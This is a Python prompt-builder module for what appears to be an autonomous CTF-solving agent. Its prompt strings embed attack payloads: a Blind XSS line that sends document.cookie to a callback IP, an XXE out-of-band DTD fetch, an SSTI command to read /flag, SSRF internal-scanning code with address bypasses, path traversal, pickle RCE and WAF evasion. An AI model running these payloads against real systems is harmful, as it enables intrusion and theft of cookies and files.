"""Prompt 分层构建器。

设计（借鉴 Claude Code 的 buildEffectiveSystemPrompt）：

层级结构：
  1. 身份层（常驻）    — 你是谁、环境规则
  2. 规则层（常驻）    — 行为约束
  3. 工具层（常驻）    — 可用工具清单
  4. 技能层（按需）    — 根据阶段+难度动态加载的方法论
  5. 上下文层（动态）  — 历史笔记、侦察缓存、跨题情报
  6. 任务层（每轮）    — 具体的 mission 指令

改进v2：
- 难度感知：easy/medium/hard 加载不同量级的 skills
- 砍掉内置工具引用：不再指示调用 js_analyzer/vuln_scanner 等脚本
- 题目描述分析：注入上下文提示
- easy 题约束：强制简单优先原则
"""

from __future__ import annotations

import os

from ..skills.loader import SkillLoader, get_default_loader

_CALLBACK_IP = os.environ.get("CALLBACK_IP", "YOUR_PUBLIC_IP")


_EASY_CONSTRAINT = (
    "\n## ★ EASY 题特殊规则（必须遵守）\n"
    "1. 先试最简单的方法：直接curl /flag、默认凭据、明显的注入点\n"
    "2. 每个攻击方向最多尝试 2 次就换下一个\n"
    "3. 严禁使用复杂攻击链（反序列化链、原型链污染、竞态条件等高级技术）\n"
    "4. 如果 8 步内没有突破，立即停下来回顾题目描述和已有发现\n"
    "5. 用最少的步骤解题，不要做不必要的扫描和探测\n"
    "6. 直接用 curl/python3 构造请求，不要调用额外的扫描脚本\n"
    "7. ★ SQL注入返回500时不要放弃！500通常意味着有过滤但注入点存在\n"
    "   尝试标准WAF绕过: 大小写混合(oR/aNd/UnIoN)、注释(/**/OR/**/)、编码(%0aOR)\n"
)

_MEDIUM_CONSTRAINT = (
    "\n## MEDIUM 题规则\n"
    "1. 先尝试简单方法，无效再逐步加深\n"
    "2. 每个方向最多 3 次无效就换下一个\n"
    "3. 优先用 curl/python3 手动构造，不依赖外部脚本\n"
    "4. 可以使用中等复杂度的攻击（JWT篡改、SSTI、文件上传绕过等）\n"
    "5. 注入返回500时不要放弃——尝试WAF绕过: 大小写混合/注释插入/URL编码/双写\n"
)

_HARD_CONSTRAINT = (
    "\n## HARD 题规则\n"
    "这是一道 HARD 题，可能需要组合攻击或高级技术。\n"
    "允许使用完整方法论：反序列化链、原型链污染、竞态条件等。\n"
    "如果 16 步以上仍无进展，可调用 search_vuln_kb/search_poc_kb 检索知识库。\n"
)

_DIFFICULTY_CONSTRAINTS = {
    "easy": _EASY_CONSTRAINT,
    "medium": _MEDIUM_CONSTRAINT,
    "hard": _HARD_CONSTRAINT,
}

_TOOL_GATE_HINT = (
    "\n## 工具使用原则\n"
    "- 优先用 Bash(curl/python3/nmap 等)自己动手，不要依赖预置脚本\n"
    "- search_vuln_kb / search_poc_kb 只在需要特定漏洞payload时调用\n"
    "- save_challenge_note 记录关键发现即可，不要频繁调用\n"
    "\n## ★★★ 命令超时控制（必须遵守）★★★\n"
    "- 所有curl命令必须加 -m 10（最大10秒超时）: `curl -s -m 10 URL`\n"
    "- nmap扫描必须限速: `nmap -T4 --max-retries 1 --host-timeout 30s TARGET`\n"
    "- python3脚本中requests必须设timeout: `requests.get(url, timeout=10)`\n"
    "- 长时间运行的bash命令用 `timeout 30 COMMAND` 包装\n"
    "- 内网扫描用python3并发+短超时: `requests.get(url, timeout=2)`\n"
    "\n## ★★★ 回连/外带配置 ★★★\n"
    "- 公网回连IP: $CALLBACK_IP（环境变量，Blind XSS/XXE OOB/反弹shell时使用）\n"
    "- Blind XSS payload: <script>fetch('http://$CALLBACK_IP:9999/'+document.cookie)</script>\n"
    "- XXE OOB: <!ENTITY % dtd SYSTEM 'http://$CALLBACK_IP:9999/evil.dtd'>%dtd;\n"
    "- 如需监听，先启动: python3 -c \"from http.server import *;HTTPServer(('0.0.0.0',9999),SimpleHTTPRequestHandler).serve_forever()\" &\n"
    "\n## ★★★ 截断输出处理（极重要）★★★\n"
    "- 如果Bash输出末尾出现 '[stdout truncated]'，说明输出被截断，你看到的不是完整内容\n"
    "- 系统会自动在截断输出中搜索flag模式，如果看到'截断输出中发现flag模式'，立即submit\n"
    "- 即使系统没检测到flag，你也必须用python3重新请求并搜索完整响应:\n"
    "  `python3 -c \"import requests,re; r=requests.get('URL',timeout=10); print(re.findall(r'flag\\{[^}]+\\}',r.text))\"`\n"
    "- 绝不要在看到截断输出后直接跳到下一个攻击方向！先确认截断内容里没有flag\n"
    "\n## ★★★ 数据处理规则（极重要）★★★\n"
    "- 当curl返回大量HTML/JSON时，用python3脚本提取关键数据\n"
    "- 对每个有数据返回的API请求，都用python3搜索flag:\n"
    "  `curl -s -m 10 URL | python3 -c \"import sys,re; print(re.findall(r'flag\\{[^}]+\\}', sys.stdin.read()))\"`\n"
    "- 对于大HTML页面，先用 `curl -s -m 10 URL | grep -oP '(href|action|src)=\\\"[^\\\"]*\\\"'` 提取链接\n"
    "\n## ★★★ 权限绕过通用策略 ★★★\n"
    "- 遇到'权限不足/forbidden/only admin'等限制时，不要只试HTTP头绕过，系统性尝试:\n"
    "  1. 修改参数名（把API文档中的参数名换成缩写/别名/同义词）\n"
    "  2. 修改HTTP方法（GET→POST→PUT→PATCH）\n"
    "  3. 修改Content-Type\n"
    "  4. 路径大小写/编码变体\n"
    "- 每种绕过如果返回了数据，**必须用python3搜索flag**，不要人工阅读截断输出\n"
    "\n## ★★★ 内网渗透策略 ★★★\n"
    "- 发现SSRF入口后，优先用python3批量探测内网:\n"
    "  ```python\n"
    "  import requests\n"
    "  for port in [80,8080,5000,3000,6379,3306,9200,8443]:\n"
    "      for host in ['127.0.0.1','internal-api','admin-api','redis','mysql','mongodb']:\n"
    "          try: r=requests.post(SSRF_URL, json={'url':f'http://{host}:{port}/'}, timeout=5); print(host,port,r.text[:200])\n"
    "          except: pass\n"
    "  ```\n"
    "- 发现内网服务后，通过SSRF遍历其API端点读取flag\n"
    "- SSRF绕过: IP十进制(2130706433)/十六进制(0x7f000001)/IPv6([::1])/短地址(127.1)\n"
)


def _phase_key_for_difficulty(phase: str, difficulty: str) -> str:
    """easy 题使用精简版 skill map。"""
    if difficulty == "easy" and phase in ("recon", "exploit"):
        return f"easy_{phase}"
    return phase


class PromptBuilder:
    """分层 Prompt 构建器，支持难度感知。"""

    def __init__(self, skill_loader: SkillLoader | None = None) -> None:
        self._skills = skill_loader or get_default_loader()

    @staticmethod
    def _inject_callback_ip(text: str) -> str:
        return text.replace("$CALLBACK_IP", _CALLBACK_IP).replace("CALLBACK_IP", _CALLBACK_IP)

    def build_system_prompt(
        self,
        phase: str = "full",
        *,
        difficulty: str = "medium",
        extra_sections: list[str] | None = None,
    ) -> str:
        actual_phase = _phase_key_for_difficulty(phase, difficulty)
        sections = self._skills.load_for_phase(actual_phase)
        sections.append(_DIFFICULTY_CONSTRAINTS.get(difficulty, _MEDIUM_CONSTRAINT))
        sections.append(_TOOL_GATE_HINT)
        if extra_sections:
            sections.extend(extra_sections)
        return self._inject_callback_ip("\n\n".join(sections))

    def build_child_system_prompt(
        self,
        phase: str,
        *,
        title: str,
        code: str,
        entrypoint: str | None = None,
        context: str = "",
        difficulty: str = "medium",
        description: str = "",
    ) -> str:
        """构建子 Agent 的 system prompt（难度感知版）。"""
        actual_phase = _phase_key_for_difficulty(phase, difficulty)
        skill_sections = self._skills.load_for_phase(actual_phase)

        child_header = (
            f"\n\n## 当前任务\n"
            f"你是主智能体分配的子智能体，只负责一个赛题，不要切换到其他赛题。\n"
            f"- 赛题: {title} (code={code})\n"
            f"- 难度: {difficulty}\n"
            f"- 入口: {entrypoint or '待获取'}\n"
        )
        if description:
            child_header += f"- 题目描述: {description}\n"

        parts = skill_sections + [
            _DIFFICULTY_CONSTRAINTS.get(difficulty, _MEDIUM_CONSTRAINT),
            _TOOL_GATE_HINT,
            child_header,
        ]

        if context:
            parts.append(f"\n## 历史上下文\n{context}")

        return self._inject_callback_ip("\n\n".join(parts))

    def build_mission_prompt(self) -> str:
        return (
            "请立即开始执行比赛流程：\n\n"
            "1. 调用 list_challenges 获取赛题列表和完成状态\n"
            "2. 对未完成赛题依次推进：start_challenge → 侦察 → 漏洞检测 → 利用 → submit_flag → stop_challenge\n"
            "3. 每道题先加载历史笔记（read_notes），了解之前的发现\n"
            "4. 用 Bash(curl/python3) 手动执行侦察和利用\n"
            "5. 每次发现关键信息后用 save_note 记录\n"
            "6. 报告进度：已完成/未完成/阻塞原因/下一步\n\n"
            "开始执行！"
        )

    def build_recon_mission(
        self,
        *,
        title: str,
        code: str,
        entrypoint: str | None,
        context: str = "",
        difficulty: str = "medium",
        description: str = "",
    ) -> str:
        parts = [
            f"你当前只处理赛题 {title} (code={code}, 难度={difficulty}) 的**侦察阶段**。",
            f"入口地址: {entrypoint or '待获取'}",
        ]
        if description:
            parts.append(f"题目描述: {description}")
        if context:
            parts.append(f"\n{context}")

        if difficulty == "easy":
            parts.append(
                "\n★★★ EASY题快速侦察，严禁过度扫描 ★★★\n\n"
                "★ 实例已启动，不要调 start_current_challenge ★\n\n"
                "执行顺序（最多8步）:\n"
                "1. curl -sIL 获取响应头 → 识别技术栈\n"
                "2. curl -s 首页，分析HTML结构和表单\n"
                "3. 直接尝试 curl /flag, /flag.txt, /admin, /api\n"
                "4. 检查泄露路径: robots.txt, .git/config, .env, /openapi.json, /docs\n"
                "5. 分析题目描述中的提示信息\n"
                "6. 尝试默认凭据快速登录\n"
                "7. save_challenge_note 保存发现\n\n"
                "★ 不要做ffuf目录扫描、不要做全面漏扫、不要调用额外脚本 ★\n"
                "★ 如果看到 [stdout truncated]，必须用 python3 重新请求搜索flag ★\n\n"
                "开始快速侦察！"
            )
        else:
            parts.append(
                "\n★★★ 你的唯一目标是信息收集，严禁尝试漏洞利用或flag提交 ★★★\n\n"
                "★ 实例已启动，不要调 start_current_challenge ★\n\n"
                "执行顺序:\n"
                "1. curl -sIL 获取响应头 → 识别技术栈\n"
                "2. curl -s 首页，分析HTML结构\n"
                "3. 手动检查JS文件中的API端点和密钥: curl -s URL | grep -oP 'src=\"[^\"]*\\.js\"'\n"
                "4. 检查泄露路径: robots.txt / .git/config / .env / swagger / actuator\n"
                "5. ffuf 目录扫描\n"
                "6. 对发现的 API 端点 curl 测试未授权访问\n"
                "7. 识别到具体产品时用 search_poc_kb 搜索\n"
                "8. 尝试默认凭据快速登录\n\n"
                "★★★ 侦察完成后，必须 save_challenge_note 保存结构化报告 ★★★\n"
                "报告格式: [技术栈] [框架版本] [输入点] [疑似漏洞] [关键发现] [建议攻击方向]\n\n"
                "开始侦察！"
            )
        return self._inject_callback_ip("\n".join(parts))

    def build_exploit_mission(
        self,
        *,
        title: str,
        code: str,
        entrypoint: str | None,
        recon_findings: str,
        attack_directions: str,
        difficulty: str = "medium",
    ) -> str:
        if difficulty == "easy":
            return (
                f"你当前只处理 EASY 赛题 {title} (code={code}) 的**漏洞利用阶段**。\n"
                f"入口地址: {entrypoint or '待获取'}\n\n"
                "★ 实例已启动，不要调 start_current_challenge ★\n\n"
                f"=== 侦察发现 ===\n{recon_findings}\n\n"
                f"=== 攻击方向（按优先级执行） ===\n{attack_directions}\n\n"
                "★★★ EASY题规则：简单优先，快速推进 ★★★\n\n"
                "执行步骤:\n"
                "1. 严格按攻击方向的优先级逐个尝试\n"
                "2. 直接用 curl/python3 构造 payload，不要调用额外脚本\n"
                "3. 一个方向 2 次无效立即换下一个\n"
                "4. 发现 flag{...} 后立即 submit_current_flag\n"
                "5. 完成后停止实例\n\n"
                "开始利用！"
            )
        return (
            f"你当前只处理赛题 {title} (code={code}) 的**漏洞利用阶段**。\n"
            f"入口地址: {entrypoint or '待获取'}\n\n"
            "★ 实例已启动，不要调 start_current_challenge ★\n\n"
            f"=== 侦察阶段的发现 ===\n{recon_findings}\n\n"
            f"=== 策略指令（必须遵循） ===\n{attack_directions}\n\n"
            "★★★ 严格按照上述策略指令执行 ★★★\n\n"
            "执行步骤:\n"
            "1. 按指定攻击方向依次尝试，用 curl/python3 手动构造 payload\n"
            "2. 需要特定漏洞知识时用 search_vuln_kb 检索\n"
            "3. 发现 flag{...} 后立即 submit_current_flag\n"
            "4. 每个重要发现用 save_challenge_note 记录\n"
            "5. 一个方向 3 次无效就切换下一个\n"
            "6. 完成后停止实例\n\n"
            "开始利用！"
        )

    def build_retry_mission(
        self,
        *,
        title: str,
        code: str,
        round_num: int | str,
        entrypoint: str | None,
        context: str,
        failed_attempts: str,
    ) -> str:
        return (
            f"你当前只处理赛题 {title} (code={code})，这是第 {round_num} 轮续攻。\n"
            f"入口地址: {entrypoint or '待获取'}（实例已启动，不要再调 start_challenge）\n\n"
            "★★★ 以下攻击方向已全部失败，严禁再尝试！★★★\n"
            f"{failed_attempts}\n\n"
            f"=== 历史发现 ===\n{context}\n\n"
            "★★★ 续攻核心原则：只尝试上面「已失败方向」中未出现的全新方向 ★★★\n\n"
            "可选的新方向（仅选择上面列表中没出现过的）:\n"
            "• SSRF深度利用: url=http://127.0.0.1/flag, file:///flag, gopher打Redis, IP变体绕过(0x7f000001/[::1]/127.1)\n"
            "• SSRF内网探测: 通过SSRF访问internal-api:5000/admin-api:5000, 批量扫描内网IP\n"
            "• 文件包含/路径穿越: ?file=../../../etc/passwd, php://filter\n"
            "• SSTI Jinja2: {{7*7}} → {{lipsum.__globals__['os'].popen('cat /flag').read()}}\n"
            "• XXE基本: <!ENTITY xxe SYSTEM 'file:///flag'> / XXE OOB外带(参数实体)\n"
            "• OOXML XXE: 构造恶意docx/xlsx上传触发XXE读/flag\n"
            "• Python反序列化: pickle RCE(__reduce__+eval) / YAML反序列化\n"
            "• PyDash原型链污染: __class__.__init__.__globals__路径\n"
            "• Blind XSS: <script>fetch('http://CALLBACK_IP:9999/'+document.cookie)</script>\n"
            "• 供应链投毒: 检查build/deploy/registry API, 依赖混淆攻击\n"
            "• JWT伪造/Session篡改: alg:none / 弱密钥\n"
            "• 竞态条件/TOCTOU: 并发请求绕过一次性限制\n"
            "• GraphQL内省: {__schema{types{name fields{name}}}} 枚举所有类型\n"
            "• 文件上传绕过: Content-Type篡改/扩展名绕过\n"
            "• nmap端口扫描: 发现其他服务端口\n"
            "• JS源码审计: 硬编码密钥/隐藏API端点\n"
            "• search_poc_kb: 检索框架相关CVE\n\n"
            "执行规则:\n"
            "1. 不要重复调 start_challenge、list_challenges\n"
            "2. 先回顾历史发现中是否有被截断的输出，用python3重新完整请求\n"
            "3. 每个新方向最多尝试3次变体就换下一个\n"
            "4. 发现 flag{...} 后必须立即 submit_current_flag\n"
            "5. 完成后停止实例\n\n"
            "开始续攻！先仔细读「已失败方向分类」，选择未出现的新方向开始。"
        )

    def estimate_tokens(self, phase: str, difficulty: str = "medium") -> dict[str, int]:
        actual_phase = _phase_key_for_difficulty(phase, difficulty)
        skill_tokens = self._skills.estimate_tokens(actual_phase)
        return {
            "phase": phase,
            "difficulty": difficulty,
            "skill_tokens": skill_tokens,
            "total_estimate": skill_tokens + 200,
        }
